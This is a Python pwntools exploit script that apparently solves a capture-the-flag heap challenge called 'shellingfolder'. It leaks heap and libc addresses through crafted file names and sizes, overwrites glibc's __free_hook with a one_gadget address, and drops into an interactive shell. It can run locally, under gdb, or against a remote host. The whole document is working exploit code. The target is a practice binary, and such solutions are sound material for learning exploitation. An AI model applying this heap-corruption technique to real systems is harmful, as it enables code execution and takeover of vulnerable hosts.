#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
#context.log_level = "debug"

chall = "./shellingfolder"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        aslr on
        loadsym
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def ls():
  p.recvuntil("Your choice:")
  p.sendline("1")

def cd(name):
  p.recvuntil("Your choice:")
  p.sendline("2")
  p.recvuntil("Choose a Folder :")
  p.sendline(name)

def mkdir(name):
  p.recvuntil("Your choice:")
  p.sendline("3")
  p.recvuntil("Name of Folder:")
  p.sendline(name)
 
def touch(name,size):
  p.recvuntil("Your choice:")
  p.sendline("4")
  p.recvuntil("Name of File:")
  p.send(name)
  p.recvuntil("Size of File:")
  p.sendline(str(size))
 
def rm(name):
  p.recvuntil("Your choice:")
  p.sendline("5")
  p.recvuntil("Choose a Folder or file :")
  p.sendline(name)
 
def show_size():
  p.recvuntil("Your choice:")
  p.sendline("6")

# heap chunk address leak
touch("A"*0x18, 0)
show_size()
p.recvuntil("A"*0x18)
leak = unpack(p.recv(6)+b'\x00'*2)
log.info("leak: 0x{:08x}".format(leak))
heap_base = leak - 0x88
log.info("heap base: 0x{:08x}".format(heap_base))

# main_arena leak form unsorted bin && clac libc base
touch(b'B'*0x18+p64(heap_base+0x18)[:-1], -0xe8)# maybe [:-1] makes ignoring NULL into string possible
rm(b'A'*0x18)
show_size()
ls()
p.recvline()
leak = unpack(p.recv(6)+b'\x00'*2)
main_arena_offset = 0x58# offset between leak to main_arena(main_arena+0x58)
log.info("main_arena+0x{:02x}: 0x{:08x}".format(main_arena_offset, leak))
main_arena = leak - main_arena_offset
log.info("main_arena: 0x{:08x}".format(main_arena))
libc_base_offset = 0x3c4b20
libc_base = main_arena - libc_base_offset
log.info("libc base: 0x{:08x}".format(libc_base))

# overwrite __free_hook && exec one_gadget
mkdir('C')
cd('C')
one_gadget = libc_base + 0x4527a
log.info("one_gadget: 0x{:08x}".format(one_gadget))
log.info("__free_hook: 0x{:08x}".format(libc_base+libc.symbols["__free_hook"]))
touch(b'D'*0x18+p64(libc_base+libc.symbols["__free_hook"])[:-1], u32(p64(one_gadget)[:4]))
touch(b'D'*0x18+p64(libc_base+libc.symbols["__free_hook"]+4)[:-1], u32(p64(one_gadget)[4:]))
show_size()# overwrite
touch('E', 0)
rm('E')

p.interactive()
